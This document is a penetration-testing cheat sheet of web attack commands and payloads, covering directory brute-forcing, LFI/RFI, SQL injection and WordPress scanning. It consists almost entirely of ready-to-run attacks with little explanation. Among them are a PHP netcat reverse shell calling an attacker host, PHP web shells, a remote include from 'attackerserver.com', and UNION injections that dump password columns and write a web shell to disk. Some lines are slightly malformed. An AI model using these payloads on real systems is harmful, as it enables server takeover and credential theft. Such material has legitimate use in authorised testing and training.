
## HTTP Enumeration
```bash
## HTTP ENUM & General Stuffs
https://pentestbook.six2dez.com/enumeration/web/quick-tricks

----------------------------------------------
# Gobuster
gobuster -u <targetip> -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://ip -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50
gobuster -u http://ip/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20 -x .txt,.php
gobuster -s "200,204,301,302,307,403,500" -w /usr/share/seclists/Discovery/Web_Content/common.txt -u http://
gobuster -s "200,204,301,302,307,403,500"  -u http://XXXX -w
gobuster -u http://ip -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 40
Gobuster comprehensive directory busting
gobuster -s 200,204,301,302,307,403 -u iop -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
Gobuster quick directory busting
gobuster -u ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

----------------------------------------------
# wfuzz 

# bruteforce
wfuzz -c -z file,six2dez/OneListForAll/onelistforall.txt --hc 404 http://ip/FUZZ
wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 400,404,500 http://x.x.x.x/FUZZ
wfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt --hc 400,404,500 http://x.x.x.x/FUZZ
wfuzz -c -z range,1-65535 --hl=2 http://ip:60000/url.php?path=1 27.0.0.1:FUZZ
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ

#DNS
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100

---------------------------------------------
# ffuf
ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml -w six2dez/OneListForAll/onelistforall.txt -u https://url.com/FUZZ
ffuf -replay-proxy http:127.0.0.1:8080

----------------------------------------------
# nikto
nıkto -h <targetip>

----------------------------------------------
# curl
curl -v -X OPTIONS http://<targetip>/test/
curl -v -k -X OPTIONS https://10.11.1.111/

# Upload if PUT enabled
curl --upload-file <file name> -v --url <url> -0 --http1.0
curl -v -X PUT -d '' http://10.11.1.111/test/shell.php

# save the cookie
curl -s http://example.com/login.php -c cookiefile -d "user=admin&pass=admin"
curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile

----------------------------------------------
# wget
wget --save-headers http://www.example.com/
    # Strict-Transport-Security (HSTS)
    # X-Frame-Options: SAMEORIGIN
    # X-XSS-Protection: 1; mode=block
    # X-Content-Type-Options: nosniff

----------------------------------------------
# Cookies
    # Check Secure and HttpOnly flag in session cookie
    # If exists BIG-IP cookie, app behind a load balancer
    
----------------------------------------------
# SSL Ciphers
nmap --script ssl-enum-ciphers -p 443 www.example.com

----------------------------------------------
# HTTP Methods
nmap -p 443 --script http-methods www.example.com
# Cross Domain Policy
curl http://example.com/crossdomain.xml
    # allow-access-from domain="*"
    
----------------------------------------------
```
## LFI & RFI
```bash
#https://pentestbook.six2dez.com/enumeration/web/lfi-rfi

#PHP Wrapper
php://filter/convert.base64-encode/resource=index.php
# Null Byte
?page=../../../../../../etc/passwd%00

----------------------------------------------
## RFI
#https://pentestbook.six2dez.com/enumeration/web/lfi-rfi

?page=http://attackerserver.com/evil.txt

----------------------------------------------
```
## Command Execution
```bash
<?php system('ls -la');?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackerip> 1234 >/tmp/f');?>

---------------------------------------------

# LFI and RCE
https://pentestbook.six2dez.com/enumeration/web/lfi-rfi

# Inject code execution
<?php echo system($_REQUEST["cmd"]);?>

# Go to LFI vuln and
?=…….&cmd=ls


----------------------------------------------
```
## SQL Injection (manual)
```bash
photoalbum.php?id=1'

# find the number of columns
photoalbum.php?id=1 order by 8

# Find space to output db
?id=1 union select 1,2,3,4,5,6,7,8

# Get username of the sql-user
?id=1 union select 1,2,3,4,user(),6,7,8

# Get version
?id=1 union select 1,2,3,4,version(),6,7,8

# Get all tables
?id=1 union select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables

# Get all columns from a specific table
?id=1 union select 1,2,3, column_name ,5,6,7,8 from information_schema.columns where table_name=‘users’
?id=1 union select 1,2,3, group_concat(column_name) ,5,6,7,8 from information_schema.columns() where table_name=‘users’
.. 1,2,3, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, email, 0x3a, pass, 0x3a, user_level) ,5,6,7,8 from users

# view files
' union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 -- -
' union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 -- -	

# upload files
' union select 1,2,3, 'this is a test message' ,5,6,7,8 into outfile '/var/www/test'-- -	
' union select 1,2,3, load_file('/var/www/test') ,5,6,7,8 -- -	
' union select null,null,null, "<?php system($_GET['cmd']) ?>" ,5,6,7,8 into outfile '/var/www/shell.php' -- -	
' union select null,null,null, load_file('/var/www/shell.php') ,5,6,7,8 -- -

----------------------------------------------
```
## wordpress
```bash
wpscan --url http://.... --log
wpscan --url http://... --enumerate u --log
wpscan --url http://<targetip> --wordlist wordlist.txt --username example_username
http://....../wp-admin
http://...../wp-content/uploads/2017/10/file.png

----------------------------------------------
```
#Windows Command Execution (RFI exploit)
```bash
#Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send 
<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
# on kali call the shell
nc -nv 10.11.25.59 4444
```
